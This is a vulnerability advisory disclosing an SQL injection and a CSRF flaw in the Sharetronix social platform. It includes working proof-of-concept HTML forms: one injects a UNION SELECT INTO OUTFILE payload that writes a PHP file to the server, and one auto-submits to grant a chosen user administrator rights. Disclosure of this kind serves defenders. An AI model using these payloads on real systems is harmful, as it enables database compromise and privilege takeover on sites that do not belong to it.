Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in Sharetronix, which can be exploited to perform SQL injection and Ð¡ross-Site Request Forgery (CSRF) attacks against vulnerable application. A remote hacker can gain full control over the application.

1) SQL Injection in Sharetronix: CVE-2014-3415

Input passed via the "invite_users[]" HTTP POST parameter to "/[group_name]/invite" URI is not properly sanitised before being used in SQL query. A remote attacker can send a specially crafted HTTP POST request and execute arbitrary SQL commands in application's database.

The following exploit code below creates a file "file.php" within the home directory of MySQL server with output of the "phpinfo()" PHP function in:

<form action="http://[host]/[group_name]/invite" method="post" name="main">
<input type="hidden" name="invite_users[]" value='0" UNION SELECT "<? phpinfo(); ?>",2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 INTO OUTFILE "file.php" -- '>
<input type="submit" id="btn">
</form>

The attacker must be registered and logged-in (the registration is open by default). The attacker also must initially create a group (action allowed by default), in our example the group name is "group_name".

2) Ð¡ross-Site Request Forgery (CSRF) in Sharetronix: CVE-2014-3414

The vulnerability exists due to insufficient validation of HTTP request origin. A remote attacker can trick a logged-in administrator to open a web page with CSRF exploit and grant administrative privileges to arbitrary existing user of the vulnerable application. The registration is open by default.

The following CSRF exploit below grants administrative privileges to the user "username":

<form action="http://[host]/admin/administrators" method="post" name="main">
<input type="hidden" name="admin" value="username">
<input type="submit" id="btn">
</form>
<script>
document.main.submit();
</script>
